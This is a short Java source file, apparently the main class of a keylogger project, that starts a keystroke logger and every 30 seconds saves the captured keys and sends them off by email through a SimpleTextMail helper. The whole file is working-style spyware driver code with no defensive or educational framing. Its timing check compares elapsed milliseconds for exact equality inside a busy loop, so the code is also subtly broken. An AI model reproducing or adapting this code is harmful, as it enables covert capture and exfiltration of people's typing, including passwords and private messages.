import email.SimpleTextMail;
import keylog.KeyLogger;

import java.awt.*;

public class MyKeyLog {
    public static void main(String[] args) {
        KeyLogger keyLogger = new KeyLogger();
        keyLogger.startKeyLogger();
        long start = System.currentTimeMillis();
        SimpleTextMail simpleTextMail = new SimpleTextMail();
        while(true){
            if(System.currentTimeMillis() - start == 30000){
                KeyLogger.nativeKeyBoard.onSave();
                simpleTextMail.SendMail();
                start = System.currentTimeMillis();
            }
        }
    }
}